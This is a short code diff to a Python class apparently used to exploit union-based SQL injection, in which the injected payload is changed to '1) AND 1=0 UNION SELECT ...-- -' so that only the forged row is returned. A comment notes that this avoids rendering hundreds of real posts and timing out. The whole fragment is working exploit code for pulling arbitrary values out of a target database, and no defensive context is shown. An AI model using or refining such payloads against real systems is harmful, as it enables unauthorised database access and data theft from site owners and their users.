@@ -253,7 +253,9 @@ class UnionSQLi:
 
     def _read(self, expression: str) -> Optional[str]:
         self.requests += 1
-        response = self.client.union_inject(f"0) UNION SELECT {self._columns(expression)}-- -")
+        # `AND 1=0` kills the base query so only the forged row is returned/rendered; without it the
+        # per_page=500 collection renders up to 500 real posts (shortcodes, embeds) and can time out.
+        response = self.client.union_inject(f"1) AND 1=0 UNION SELECT {self._columns(expression)}-- -")
         match = self._RE.search(response.body)
         if not match:
             return None
